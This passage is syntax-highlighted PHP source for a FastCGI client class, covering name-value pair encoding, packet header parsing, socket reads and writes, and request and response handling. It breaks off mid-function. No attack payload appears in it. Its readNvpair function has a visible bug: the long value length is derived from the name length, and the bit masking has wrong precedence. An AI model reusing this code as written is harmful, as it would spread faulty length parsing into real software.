punctuation">(</span> <span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">/* nameData &amp; valueData */</span>
        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readNvpair</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span> <span class="token variable">$data</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">++</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">++</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">++</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">++</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">++</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">++</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">++</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">++</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$array</span><span class="token punctuation">[</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span> <span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$p</span>                                   <span class="token operator">+=</span> <span class="token punctuation">(</span> <span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">decodePacketHeader</span><span class="token punctuation">(</span> <span class="token variable">$data</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$ret</span>                  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">HEADER_LEN</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$resp</span>            <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span> <span class="token variable">$packet</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$buf</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$len</span>             <span class="token operator">-=</span> <span class="token function">strlen</span><span class="token punctuation">(</span> <span class="token variable">$buf</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$buf</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValues</span><span class="token punctuation">(</span> <span class="token keyword type-hint">array</span> <span class="token variable">$requestedInfo</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span> <span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span> <span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES_RESULT</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readNvpair</span><span class="token punctuation">(</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Unexpected response type, expecting GET_VALUES_RESULT'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">request</span><span class="token punctuation">(</span> <span class="token keyword type-hint">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">async_request</span><span class="token punctuation">(</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">wait_for_response</span><span class="token punctuation">(</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">async_request</span><span class="token punctuation">(</span> <span class="token keyword type-hint">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// Pick random number between 1 and max 16 bit unsigned int 65535</span>
        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span> <span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// Using persistent sockets implies you want them keept alive by server!</span>
        <span class="token variable">$keepAlive</span>     <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token class-name">_keepAlive</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_persistentSocket</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$request</span>       <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BEGIN_REQUEST</span>
            <span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">RESPONDER</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token variable">$keepAlive</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token punctuation">)</span>
            <span class="token punctuation">,</span> <span class="token variable">$id</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span> <span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$paramsRequest</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$paramsRequest</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">,</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$stdin</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">,</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">fwrite</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$request</span> <span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token keyword type-declaration">false</span> <span class="token operator">||</span> <span class="token class-name">fflush</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">stream_get_meta_data</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'timed_out'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TimedOutException</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Write timed out'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token comment">// Broken pipe, tear down so future requests might succeed</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Failed to write request to socket'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_requests</span><span class="token punctuation">[</span> <span class="token variable">$id</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
            <span class="token string single-quoted-string">'state'</span>    <span class="token operator">=></span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">REQ_STATE_WRITTEN</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'response'</span> <span class="token operator">=></span> <span class="token constant">null</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">wait_for_response</span><span class="token punctuation">(</span> <span class="token variable">$requestId</span><span class="token punctuation">,</span> <span class="token variable">$timeoutMs</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_requests</span><span class="token punctuation">[</span> <span class="token variable">$requestId</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Invalid request id given'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_requests</span><span class="token punctuation">[</span> <span class="token variable">$requestId</span> <span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'state'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token class-name">REQ_STATE_OK</span>
            <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_requests</span><span class="token punctuation">[</span> <span class="token variable">$requestId</span> <span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'state'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">REQ_STATE_ERR</span>
        <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_requests</span><span class="token punctuation">[</span> <span class="token variable">$requestId</span> <span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'response'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$timeoutMs</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// Reset timeout on socket for now</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">set_ms_timeout</span><span class="token punctuation">(</span> <span class="token variable">$timeoutMs</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$timeoutMs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_readWriteTimeout</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$startTime</span> <span class="token operator">=</span> <span class="token function">microtime</span><span class="token punctuation">(</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token class-name">STDOUT</span> <span class="token operator">||</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDERR</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDERR</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_requests</span><span class="token punctuation">[</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">REQ_STATE_ERR</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
